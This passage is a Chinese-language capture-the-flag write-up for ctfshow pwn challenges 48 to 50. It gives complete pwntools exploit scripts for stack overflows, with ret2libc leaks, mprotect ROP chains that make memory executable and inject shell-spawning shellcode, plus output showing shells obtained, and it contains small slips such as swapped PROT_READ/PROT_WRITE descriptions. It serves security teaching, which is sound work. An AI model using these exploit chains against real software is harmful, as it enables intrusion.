class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;O.o?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">103</span>]; <span class="comment">// [esp+Dh] [ebp-6Bh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出</p><p>套板子:</p><ol><li>利用puts函数去泄露libc版本</li><li>计算偏移量，算出程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li><li>利用溢出漏洞，构造rop，获取shell</li></ol><p>32位的相对来说比64位的还是简单一些，通过上面这些应该对32位跟64位的程序漏洞利用已经有了</p><p>一个区分了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x6b</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts=u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=lib_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x6b</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 401</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0xf7df2140</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn49"><a href="#pwn49" class="headerlink" title="pwn49"></a>pwn49</h2><p>Hint：静态编译？或许你可以找找mprotect函数</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ file pwn &amp;&amp; checksec pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=db1e246fe40dca2886c2fe54a05b53299506f3fc, not stripped</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>statically linked可以看到是静态编译的，32位程序，仅关闭PIE（这里等下大家会发现有一个问题）</p><p>还是在这里先给大家解答一下这个疑问吧，这里检测到开启了栈保护，但是简单测试后发现并没有开启这个保护</p><p>但是这里为什么checksec的时候开启了保护呢？</p><p>原因在这，由于这是较老版本的checksec，它应该是检测到有这个函数就算打开了栈保护</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn _stack_chk_fail_local()</span><br><span class="line">&#123;</span><br><span class="line">  _fortify_fail_abort(<span class="number">0</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在新版本的checksec中并不会出现此问题：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   No Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2148 Symbols  No00./pwn</span><br></pre></td></tr></table></figure><p>这里的话看个人习惯，如果喜欢新版本的话可以自行去安装一个新版本的。</p><p>因此这里的话并没有开启栈保护。</p><p>IDA查看一下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init_0();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是函数非常的多，从这我们也能看出来是静态编译</p><p>查找一下mprotect函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nsigned <span class="type">int</span> __cdecl <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addy, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = sys_mprotect(addy, len, flags);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0xFFFFF001</span> )</span><br><span class="line">    <span class="keyword">return</span> _syscall_error();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确实有，那么它的作用是什么呢？</p><p>它的作用是能够修改内存的权限为可读可写可执行，然后我们就可以往栈上写入shellcode，执行</p><p>获取shell</p><table><thead><tr><th><strong>int mprotect(const void *start, size_t len, int prot);</strong></th></tr></thead><tbody><tr><td>第一个参数填的是一个地址，是指需要进行操作的地址。</td></tr><tr><td>第二个参数是地址往后多大的长度。</td></tr><tr><td>第三个参数的是要赋予的权限。</td></tr><tr><td>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</td></tr></tbody></table><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p><p>5） <strong>prot&#x3D;7</strong> <strong>是可读可写可执行</strong></p><p>指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。</p><p>指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。 那么就</p><p>可以开始我们的操作了： 首先造成溢出，让程序跳转到mprotect函数地址，去执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0x12+4) + p32(mprotect)</span><br></pre></td></tr></table></figure><p>Choose segment to jump(shift+F7),调出程序的段表，将0x80DA000地址开始修改为可读可写可执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt080DA000080DA044RW..Ldword0013publicDATA32FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0014FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">.bss080DB320080DBFFCRW..Lalign_320019publicBSS32FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0014FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br></pre></td></tr></table></figure><p>为什么是0x80DA000而不是bss段的开头0x80DB320，因为指定的内存区间必须包含整个内存页（4K）,起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p><p>使用ROPgadget找到我们需要的ret指令，我们mprotect函数需要设置3个参数，这边就找到3个寄存器就行</p><p>由于是静态编译，这里的gadget非常多，因此我们需要更加精准的命令来帮助我们找到我们需要gadget,这里可以在后面用管道添加参数筛选一下： | grep pop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn --only <span class="string">&quot;pop|ret&quot;</span>|grep pop</span><br><span class="line">...</span><br><span class="line">0x080a019b : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后来设置mprotect的参数，将返回地址填上read函数，我们接下来要将shellcode读入程序段，需要继续控制程序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p32(pop_ebx_esi_ebp_ret) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line">payload += p32(read_addr)</span><br></pre></td></tr></table></figure><p>read函数原型:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>; </span><br></pre></td></tr></table></figure><p>fd 设为0时就可以从输入端读取内容 设为0</p><p>buf 设为我们想要执行的内存地址 设为我们已找到的内存地址0x80EB000</p><p>size 适当大小就可以 只要够读入shellcode就可以，设置大点无所谓</p><p>可以看到read函数也有三个参数要设置，我们就可以继续借用上面找到的有3个寄存器的ret指令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(M_addr)+p32(M_size)+p32(M_addr)</span><br></pre></td></tr></table></figure><p>到这里我们已经完成了修改内存为可读可写可执行，将程序重定向到了我们修改好后的内存地址，</p><p>接下来我们只要传入shellcode即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28185)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x80a019b</span> </span><br><span class="line">M_addr = <span class="number">0x80DA000</span></span><br><span class="line">M_size = <span class="number">0x1000</span>  <span class="comment">#0x80DA000 % 0x1000 == 0</span></span><br><span class="line">M_proc = <span class="number">0x7</span> <span class="comment">#可读可写可执行</span></span><br><span class="line">payload = cyclic(<span class="number">0x12</span>+<span class="number">4</span>) + p32(mprotect)</span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret) + p32(M_addr) + p32(M_size)+p32(M_proc)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(M_addr)+p32(M_size)+p32(M_addr)</span><br><span class="line"><span class="comment">#payload += p32(read_addr)  # 调用read函数</span></span><br><span class="line"><span class="comment">#payload += p32(pop_ebx_esi_ebp_ret)  # 用于设置read的参数</span></span><br><span class="line"><span class="comment">#payload += p32(0)  # fd = 0（标准输入）</span></span><br><span class="line"><span class="comment">#payload += p32(M_addr)  # buf = 0x80DA000（可执行内存区域）</span></span><br><span class="line"><span class="comment">#payload += p32(M_size)  # count = 0x1000（读取4096字节）</span></span><br><span class="line"><span class="comment">#payload += p32(M_addr)  # read执行后跳转到此地址（即shellcode起始地址）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 420</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn50"><a href="#pwn50" class="headerlink" title="pwn50"></a>pwn50</h2><p>Hint：好像哪里不一样了，远程libc环境 Ubuntu 18</p><p>可以继续使用ret2libc来完成这题，会更简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007e3</span></span><br><span class="line">ret=<span class="number">0x4004fe</span>  <span class="comment">#注意是Ubuntu 18，有栈对齐问题</span></span><br><span class="line">payload=cyclic(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts=u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">payload=cyclic(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 549</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0x7ffff7e27be0</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag pwn</span><br></pre></td></tr></table></figure><p>目的是进一步学习mprotect函数</p><p>主要流程如下：</p><ol><li>泄漏内存地址,通过计算得到libc地址</li><li>通过mprotect函数来修改一段区域的权限</li><li>向这段区域写入shellcode</li><li>跳转到写入shellcode的区域</li></ol><p>显然，这样对做这题来讲可能会更加繁琐，但是跟着一步步调试后，会对mprotect这个函数有更加深刻的认识了。</p><p>检查保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位开启NX，部分开启RELRO</p><p>首先第一步：泄漏内存地址,通过计算得到libc地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span> </span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] libc_base = 0x7ffff7dcd0000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello CTFshow</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>第二步：通过mprotect函数来修改bss的权限为rwx:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;bash&#x27;, &#x27;-c&#x27;] #当前窗口</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>修改前：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line">          0x400000           0x401000 r-xp     1000       0 pwn</span><br><span class="line">          0x601000           0x602000 r--p     1000    1000 pwn</span><br><span class="line">          0x602000           0x603000 rw-p     1000    2000 pwn</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line">          0x400000           0x401000 r-xp     1000       0 pwn</span><br><span class="line">          0x601000           0x602000 rwxp     1000    1000 pwn</span><br><span class="line">          0x602000           0x603000 rw-p     1000    2000 pwn</span><br><span class="line">   ...</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>第三步：向bss段中写入shellcode:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span 